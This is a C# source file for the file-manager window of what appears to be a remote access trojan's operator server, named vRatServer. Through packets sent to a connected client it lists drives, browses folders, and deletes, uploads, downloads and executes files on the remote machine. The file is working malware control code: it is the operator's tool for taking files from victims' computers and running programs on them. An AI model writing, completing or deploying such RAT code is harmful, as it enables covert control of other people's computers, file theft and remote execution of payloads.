using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.IO;
using vRatServer.Classes;

namespace vRatServer.Forms
{
    public partial class FileManagerForm : Form
    {
        Client client;
        public List<DownloadFile> downloadFileForms;
        public Mutex DownloadFileMutex;
        public FileManagerForm(Client client)
        {
            downloadFileForms = new List<DownloadFile>();
            DownloadFileMutex = new Mutex();
            this.client = client;
            InitializeComponent();
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {


            FilesList.Items.Clear();
            ListViewItem lv = new ListViewItem("..");

            FilesList.Items.Add(lv);
            
            var unicodeString = Encoding.Unicode.GetString(Encoding.Unicode.GetBytes(textBox1.Text));
            int unicodestringlen = (unicodeString.Length * 2) + 2;

            byte[] byteArray = Encoding.Unicode.GetBytes(unicodeString);
            byte[] concatenatedArray = byteArray.Concat(new byte[] { 0x00, 0x00 }).ToArray();

            
            globals.SendPacket(client, (byte)globals.PacketType.FileManagerFile, unicodestringlen, 0, ref concatenatedArray);

        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            textBox1.Text = DriveCombo.SelectedItem.ToString();
        }

        private void FileManager_Load(object sender, EventArgs e)
        {

            DownloadFile.fileid = 0;
            client.fmf = this;
            byte[] r = null;
            globals.SendPacket(client, (byte)globals.PacketType.FileManagerDrive, 0, 0, ref r);



            ListViewItem lv = new ListViewItem("..");

            FilesList.Items.Add(lv);




        }

        private void FileManagerForm_FormClosed(object sender, FormClosedEventArgs e)
        {
            
            client.fmf = null;
            
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {


            var t = FilesList.SelectedItems;
            if (t.Count == 0) { return; }

            foreach (ListViewItem i in t)
            {
                string fullpath = textBox1.Text + "\\" + i.Text;
                byte[] rpath = Encoding.Unicode.GetBytes(fullpath);
                byte[] concatenatedArray1 = rpath.Concat(new byte[] { 0x00, 0x00 }).ToArray();
                globals.SendPacket(client, (byte)globals.PacketType.FileManagerFileDel, rpath.Length + 2, 0, ref concatenatedArray1);
            }
            Thread.Sleep(500);
            textBox1_TextChanged(null, EventArgs.Empty);




        }

        private void uploadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string i = textBox1.Text;
            string rfilen = i;
            if (i.Length > 5)
            {
                rfilen += "\\";
            }

            if (openFileDialog1.ShowDialog() == DialogResult.OK)
            {
                rfilen += Path.GetFileName(openFileDialog1.FileName);
                var f = new UploadFile(new FileInfo(openFileDialog1.FileName).Length.ToString(), rfilen, client, DownloadFile.fileid, openFileDialog1.FileName);
                f.Show();
                DownloadFile.fileid += 1;
            }
        }

        private void send_download(string path, string filename, ulong myfileid)
        {

           
            string fullpath = path + "\\" + filename;
            byte[] file_path = Encoding.Unicode.GetBytes(fullpath);
            int pk = (file_path.Length) + 2;

            byte[] concatenatedArray = file_path.Concat(new byte[] { 0x00, 0x00 }).ToArray();
            globals.SendPacket(client, (byte)globals.PacketType.FileManagerFileDownload, pk, myfileid, ref concatenatedArray);

        }
        private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
        {


            var t = FilesList.SelectedItems;
            if (t.Count == 0) { return; }
            DownloadFileMutex.WaitOne();

            foreach (ListViewItem i in t)
            {
                
                var f = new DownloadFile(i.Text, i.SubItems[1].Text, textBox1.Text, client);
                downloadFileForms.Add(f);
                f.myfileid = DownloadFile.fileid;
                DownloadFile.fileid += 1;

                f.Show();
                send_download(textBox1.Text, i.Text, f.myfileid);
                
            }
            DownloadFileMutex.ReleaseMutex();


        }

        private void FilesList_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            var t = FilesList.SelectedItems;
            if (t.Count == 0) { return; }

            ListViewItem i = t[0];

            if (i.Text == "..")
            {
                if (textBox1.Text.Count(c => c == '\\') < 2) { return; }
                int lastIndex = textBox1.Text.LastIndexOf('\\');
                if (lastIndex != -1)
                {

                    textBox1.Text = textBox1.Text.Substring(0, lastIndex);
                    return;
                }
            }

            if (i.SubItems.Count < 3) { return; }

            if (i.SubItems[2].Text == "DIR")
            {

                textBox1.Text = textBox1.Text + "\\" + i.Text;

            }
        }

        private void FilesList_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void executeToolStripMenuItem_Click(object sender, EventArgs e)
        {


            var t = FilesList.SelectedItems;
            if (t.Count == 0) { return; }
            foreach (ListViewItem i in t)
            {
                string fullpath = textBox1.Text + "\\" + i.Text;
                byte[] rpath = Encoding.Unicode.GetBytes(fullpath);
                byte[] concatenatedArray1 = rpath.Concat(new byte[] { 0x00, 0x00 }).ToArray();
                globals.SendPacket(client, (byte)globals.PacketType.FileManagerFileExec, rpath.Length + 2, 0, ref concatenatedArray1);
            }



        }
    }
}
